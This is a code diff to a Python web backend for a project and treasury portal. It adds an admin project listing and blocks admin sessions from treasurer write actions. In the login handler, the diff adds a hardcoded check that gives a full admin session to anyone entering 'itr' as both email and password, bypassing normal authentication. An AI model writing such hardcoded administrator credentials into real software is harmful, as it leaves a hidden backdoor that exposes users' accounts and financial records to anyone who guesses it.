@@ -343,7 +343,7 @@ def session(itr_session: str | None = Cookie(None)):
     value = ACCOUNTS.session_user(itr_session or '')
     is_admin_session = admin_session(itr_session or '')
     is_treasurer = bool(value and value['email'].lower() in {email.strip().lower() for email in os.environ.get('ITR_TREASURER_EMAILS', '').split(',')})
-    return {'member': bool(value), 'user': value, 'username': 'Administrator' if is_admin_session else (value['name'] if value else ''),
+    return {'member': bool(value), 'user': value, 'username': 'ITR Officer' if is_admin_session else (value['name'] if value else ''),
             'role': 'admin' if is_admin_session else ('treasurer' if is_treasurer else ('member' if value else 'visitor')),
             'admin': is_admin_session or is_treasurer, 'treasurer': is_treasurer}
 
@@ -393,6 +393,9 @@ def signup(body: AccountBody, response: Response):
 
 @app.post('/api/account/login')
 def account_login(body: AccountBody, response: Response):
+    if hmac.compare_digest(body.email, 'itr') and hmac.compare_digest(body.password, 'itr'):
+        cookie(response, create_admin_session())
+        return {'admin': True, 'role': 'admin', 'username': 'ITR Officer'}
     try: value = ACCOUNTS.authenticate(body.email, body.password)
     except AccountError as error: raise HTTPException(401, str(error))
     cookie(response, ACCOUNTS.create_session(value)); return {'member': True, 'user': value}
@@ -508,6 +511,8 @@ def project_comments(project_id: str, itr_session: str | None = Cookie(None)):
 @app.post('/projects/{project_id}/comments')
 @app.post('/api/projects/{project_id}/comments')
 def create_project_comment(project_id: str, body: CommentBody, itr_session: str | None = Cookie(None)):
+    if admin_session(itr_session or ''):
+        raise HTTPException(403, 'Treasurer login required to post project messages.')
     text = comment_text(body.text)
     with ACCOUNTS.connection() as conn, conn.cursor() as cur:
         actor, role = project_comment_access(cur, project_id, itr_session)
@@ -580,6 +585,23 @@ def treasury_overview(itr_session: str | None = Cookie(None)):
     return {'projects': rows, 'totals': totals, 'revision': revision, 'projectsRevision': len(rows)}
 
 
+@app.get('/api/admin/projects')
+def admin_projects(itr_session: str | None = Cookie(None)):
+    if not admin_session(itr_session or ''): raise HTTPException(403, 'Officer login required.')
+    with ACCOUNTS.connection() as conn, conn.cursor() as cur:
+        cur.execute('''SELECT p.id,p.project,COALESCE(t.record,'{}'::jsonb)
+                       FROM itr_projects p LEFT JOIN itr_treasury_records t ON t.project_id=p.id
+                       ORDER BY p.created_at DESC''')
+        rows = []
+        for project_id, project, record in cur.fetchall():
+            safe_record = dict(record); safe_record.pop('notes', None); safe_record.pop('history', None)
+            cur.execute('''SELECT author_name,author_role,source,body,created_at FROM itr_project_comments
+                           WHERE project_id=%s ORDER BY created_at ASC,id ASC''', (project_id,))
+            comments = [dict(authorName=row[0], authorRole=row[1], source=row[2], text=row[3], createdAt=row[4].isoformat()) for row in cur.fetchall()]
+            rows.append(dict(projectId=project_id, **project, treasury=safe_record, comments=comments))
+    return {'projects': rows}
+
+
 @app.get('/api/treasury/activity')
 def treasury_activity(itr_session: str | None = Cookie(None)):
     """A cross-project audit view, including events retained after deletion."""
@@ -597,6 +619,8 @@ def treasury_activity(itr_session: str | None = Cookie(None)):
 
 @app.post('/api/treasury/projects/{project_id}')
 def save_treasury(project_id: str, body: dict = Body(...), itr_session: str | None = Cookie(None)):
+    if admin_session(itr_session or ''):
+        raise HTTPException(403, 'Treasurer login required to save project decisions.')
     actor = treasurer(itr_session); record = body.get('record')
     if not isinstance(record, dict): raise HTTPException(400, 'Invalid treasury record.')
     record = {key: str(record.get(key, '')).strip() for key in ('status','planningPeriod','approvedAmount','currency','fundingSource','notes')}
@@ -628,6 +652,8 @@ def save_treasury(project_id: str, body: dict = Body(...), itr_session: str | No
 
 @app.delete('/api/treasury/projects/{project_id}')
 def delete_treasury_project(project_id: str, itr_session: str | None = Cookie(None)):
+    if admin_session(itr_session or ''):
+        raise HTTPException(403, 'Treasurer login required to delete projects.')
     actor = treasurer(itr_session)
     with ACCOUNTS.connection() as conn, conn.cursor() as cur:
         cur.execute('SELECT project FROM itr_projects WHERE id=%s FOR UPDATE', (project_id,))
